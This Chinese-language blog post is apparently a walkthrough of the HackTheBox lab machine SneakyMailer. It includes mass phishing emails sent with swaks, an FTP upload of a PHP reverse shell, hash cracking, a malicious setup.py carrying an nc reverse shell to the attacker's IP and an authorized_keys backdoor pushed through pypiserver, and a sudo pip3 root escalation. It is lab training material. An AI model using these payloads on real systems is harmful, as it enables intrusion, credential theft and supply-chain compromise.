---
layout: post
title:  "HackTheBox >_ SneakyMailer_197"
description: walkthrough
category: HackTheBox
---
# SneakyMailer_197

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201206125345655_20094.png)

这个很难

```bash
$ rustscan 10.10.10.197 -b 1000 -t 1500 -n
```

![]({{ site.url }}/assets/SneakyMailer_197.assets/20200929210631441_1009335553.png)

![]({{ site.url }}/assets/SneakyMailer_197.assets/20200929210654857_2019795406.png)

![]({{ site.url }}/assets/SneakyMailer_197.assets/20200929211108748_813344590.png)

ftp:

![]({{ site.url }}/assets/SneakyMailer_197.assets/20200929211301654_1174931010.png)

![]({{ site.url }}/assets/SneakyMailer_197.assets/20200929222224390_273615974.png)

用户邮箱，用户名。搜集爆破

`cewl http://sneakycorp.htb/team.php -m 6 --lowercase -w wordlist.txt`

爆破服务。
但是无果

参考靶机的名称，以及存在的服务，和这么多的email，我们或许可以对邮件服务下手

使用-a用来搜集表内的mete data，使用 -e 搜集email

`cewl http://sneakycorp.htb/team.php -m 6 --lowercase -e -a -w wordlist_2.txt`

将email单独存为email.txt

监听端口

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030205459585_1421.png)

首先测试邮箱联通，验证概念

邮箱服务是sneakymailer.htb 同样加入hosts

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030210249175_15532.png)

`while read email;do swaks -to $email ;done < email.txt`

都是可以发送的，
批量发送邮件

`while read email; do swaks -to $email -from admin@sneakymailer.htb -header "Subject:whoami" -body "http://10.10.14.35:8080/" -server 10.10.10.197;done < email.txt`

在监听端口得到信息

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030212120724_29816.png)

`firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt`

bp中直接decode

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030212311448_28124.png)
```
firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```
所以邮箱的凭证应该是

```
paulbyrd@sneakymailer.htb
^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```
thunderbird 登录



![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030212605021_6855.png)

总是失败，不能加入邮箱

更换客户端，使用evolution


![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030215257990_10498.png)

一组凭证
```
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
```

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030215448240_12737.png)

让low在pypi 服务安装测试并删除所有的python模块

凭证无法在ssh登录

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030221216735_24252.png)

但是可以在ftp使用

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030221312823_23684.png)

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030221343167_10434.png)

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030221424155_30647.png)

看目录是http服务的目录
支持php
上传个webshell测试

在kali工作目录准备一个webshell
`$ cp /usr/share/davtest/backdoors/php_cmd.php .`

put到ftp，之前已经用binary转为bin传输模式，不再修改直接put

`put php_cmd.php`

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030221842968_8833.png)

浏览器浏览失败

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030222305539_790.png)

检查

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030222323821_1705.png)

被删除了。

尝试几次后发现，无论是否被删除，浏览器都无法定位到我们上传的文件。

这说名这可能是其他域名下的网站目录。参考文件夹是dev，可能是专门用来开发使用的子域名。

而按照网页上和邮件的显示，网站仍在开发中。也就是子域名仍然存在。
爆破子域名

`wfuzz --sc=200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.10.197 -H "HOST: FUZZ.sneakycorp.htb"`

得到dev

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030235551606_29277.png)

加入hosts

`dev.sneakycorp.htb`

因为会被删除，我们写一句bash，用来快速连续执行

```bash
#!/bin/bash
ftp -v -n 10.10.10.197<<EOF
user developer m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
binary
cd /dev
put php-reverse-shell.php
close
bye
EOF
curl http://dev.sneakycorp.htb/php-reverse-shell.php
```

```
$ chmod +x ftp_put.sh
./ftp_put.sh
```
稍等即获得shell

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030235354550_20597.png)

`python -c "import pty; pty.spawn(['/bin/bash']);"`

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030235743752_14512.png)


看目录结构应该还有一个域名，同时参考邮件，这应该是下一步的线索
同样加入hosts查看
80没变化
查看8080

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201030235918488_7173.png)

可以安装packages
点击here尝试查看包
需要凭证登录。
![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031001425332_17148.png)

验证，应该是存在apache加密，在目录中查找
查看这个目录，但是我们同样没有权限进入packages

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031000521292_24528.png)

找到apache的加密文件.htpasswd
查看一下

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031000604245_22782.png)

`pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/`

写入本地文件，使用john破解
`$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt`

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031000948285_13814.png)

`soufianeelhaoui  (pypi)`

`pypi:soufianeelhaoui`

使用这组凭证登录

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031001633145_30670.png)

没有文件，
到这里卡住了，

继续枚举

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031034715816_32062.png)

5000有一个服务




理论上我们应该能将自己的packages存入目录，然后等low来安装，这样就可以获得low的权限，但是我们没有写权限

我们有两组凭证尝试一下切换用户

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031021751626_3391.png)

只能切换到developer
仍然不能写入packages

搜索了一下pypiserver
在文档中找到了线索

`https://pypi.org/project/pypiserver/#upload-with-setuptools`

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031002347031_11927.png)

发现是可以通过setuptools上传文件到指定位置的

## 错误的尝试
----
以下为错误部分，但值得思考

根据文档在本地构造

```bash
[distutils]
index-servers =
  pypi
  local

[pypi]
username:x
password:x

[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

payload.py

```python
import setuptools
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.35 1339 >/tmp/f")
setuptools.setup(
        name='payload',
        version='1',
        author='evil',
        license='MIT'
)
```
```
mkdir /tmp/evilx
cd /tmp/evilx
```
按照文档.pypirc需要放在用户文件夹下
将PATH设置到这里
`export HOME=/tmp/evilx`

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031025402630_31886.png)

```
wget http://10.10.14.35:8080/.pypirc
wget http://10.10.14.35:8080/payload.py

python3 payload.py sdist register -r local upload -r local
```

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031025505651_14969.png)

进入python的虚拟环境，现在应该拥有python的全部已安装模块

`chmod +x payload.py`

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031025721180_20323.png)

`python3 payload.py sdist register -r local upload -r local`

在1339获得了shell
但是不是正确的用户，而仍然是developer的

ctrl c 取消掉。

应该是打包时直接执行 了payload中的命令，而不是先上传完。等待low执行。

显然执行shell这条路是不行的（后面发现这是做错了）

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031032027694_3602.png)

low用户是有ssh的。

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031032116396_23919.png)

查看一下

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031040619188_25830.png)

修改一下payload，执行low能执行的命令，即使报错也能往下执行安装
我们来尝试向low用户的文件夹写入我们自己的认证key，从而使我们能ssh登录，能写入则为为low直接执行写入，报错则向下进行，打包上传packages.

本地生成

`ssh-ed25519`

`$ ssh-keygen -b 2048 -t ed25519 -f ./id_rsa -q`

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICcbgJ5j4njB27KYDtnJJ4zvAPMo0bKtz+QfaZ1BRVwd user@k41i
```

注意给私钥600权限，稍后要使用登录

同时修改版本号和名称。防止重复
payload_4.py
```python
import setuptools

try:
    with open("/home/low/.ssh/authorized_keys", "a") as f:
        f.write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICcbgJ5j4njB27KYDtnJJ4zvAPMo0bKtz+QfaZ1BRVwd user@k41i")
        f.close()
except Exception as e:
    pass
    setuptools.setup(
            name='payload_4',
            version='1.4',
            author='evil',
            license='MIT'
    )
```

```
wget http://10.10.14.35:8080/payload_4.py
chmod +x payload_4.py
python3 payload_4.py sdist register -r local upload -r local
```

`ls -la /var/www/pypi.sneakycorp.htb/`

`ls -la /var/www/pypi.sneakycorp.htb/packages`

仍然不行

枚举发现端口5000正在运行，curl发现是同样的服务

`cat /home/low/.ssh/authorized_keys`


`curl http://pypi.sneakycorp.htb:5000/packages`

修改端口号为5000ip为靶机内部。重复之前的步骤
```
[distutils]
index-servers =
  pypi
  evilx

[pypi]
username:x
password:x

[evilx]
repository: http://127.0.0.1:5000
username: pypi
password: soufianeelhaoui
```
仍然不行，

## 正确的获得user
----

重新参照文档
重新规范步骤
最终成功

setup.py
```python
import setuptools

try:
    with open("/home/low/.ssh/authorized_keys", "a") as f:
        f.seek(0)
        f.truncate()
        f.write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICcbgJ5j4njB27KYDtnJJ4zvAPMo0bKtz+QfaZ1BRVwd user@k41i")
except Exception as e: pass

setuptools.setup(
    name="evilx",
    version="0.0.1",
    packages=['evilx'],
    description='evilx',
    url='http://pypi.sneakycorp.htb/evilx',
    author="evilx"
)
```
之前的问题是没有写url以及打包的名，同时脚本推key的时候是追加，实际使用中因为有其他玩家，会导致key追加在后面，而不是预期的替换整个内容。增加
f.seek(0)和f.truncate()两个函数，帮助文件定位到开头，并清空文件内容

.pypirc
```
[distutils]
index-servers =
  pypi
  evilx
[pypi]
username:x
password:x
[evilx]
repository: http://127.0.0.1:5000
username: pypi
password: soufianeelhaoui
```
注意端口是打的5000，没有再试试是否能对8080正常使用
上传到靶机，
注意目录结构
```
cd /tmp/evilx
touch README.md
wget http://10.10.14.35:8080/setup.py
wget http://10.10.14.35:8080/setup.cfg
```
在`/tmp/evilx`再建立一个evilx文件夹，存入`__init__.py`
```
mkdir evilx
cd /tmp/evilx/evilx
wget http://10.10.14.35:8080/__init__.py
```
退回`/tmp/evilx`，传输`.pypirc`
```
cd /tmp/evilx
wget http://10.10.14.35:8080/.pypirc
```
![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031052941593_24628.png)

打包
```
python3 setup.py sdist
```
修改环境变量，并上传
```
export HOME=/tmp/evilx
python3 setup.py sdist upload -r evilx
```
![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031054635400_31784.png)

这时只要查看key，看内容是否被推入即可

`cat /home/low/.ssh/authorized_keys`

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031055258886_16225.png)

一旦推入，ssh即可免密登录

## root

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031061041218_31034.png)

得到user
![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031055418697_28202.png)

sudo -l没有要求输入密码，并且可以免密使用pip3

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031055516222_32608.png)

直接gtfobins提权

```bash
TF=$(mktemp -d)

echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty)>$(tty) 2>$(tty)')" > $TF/setup.py

sudo /usr/bin/pip3 install $TF
```
![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031055834236_7740.png)

![]({{ site.url }}/assets/SneakyMailer_197.assets/20201031055855769_2208.png)